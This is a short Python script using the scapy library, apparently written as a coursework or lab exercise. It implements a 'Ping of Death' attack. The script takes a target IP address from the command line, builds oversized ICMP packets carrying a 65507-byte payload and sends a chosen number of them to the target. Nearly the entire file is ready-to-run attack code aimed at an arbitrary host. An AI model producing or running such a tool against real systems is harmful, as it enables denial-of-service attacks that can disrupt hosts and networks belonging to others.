"""
Authors : Fridez Lucas, Maxime Welcklen
Attack : Ping of Death
"""

# Imports
from scapy.all import *
from scapy.layers.inet import *
import sys
import argparse


def __configure_argparse__():
    """Configure argparser

    Returns:
        parser: Arguments parser
    """
    parser = argparse.ArgumentParser(
        description='Ping of Death attack arguments')

    # Required params
    requiredNamed = parser.add_argument_group('Required named arguments')
    requiredNamed.add_argument(
        '-d', '--dst', help='Destination address', required=True)

    # Optionnal params
    optionnalNamed = parser.add_argument_group('Optionnal named arguments')
    optionnalNamed.add_argument(
        '-n', '--numberPings', type=int, default=5, help='Number of pings')

    return parser


def main(destination_ip, nbr_ping):
    """Main method that handle attack logic

    Args:
        destination_ip (str): Destination IP
        nbr_ping (int): Number of ping packets
    """
    MESSAGE = "P"
    pingOFDeath = IP(dst=destination_ip)/ICMP()/(MESSAGE * 65507)
    send(nbr_ping * pingOFDeath)


# Entry point
# Run this script in sudo mode !
if __name__ == "__main__":
    parser = __configure_argparse__()
    args = parser.parse_args()
    main(args.dst, args.numberPings)
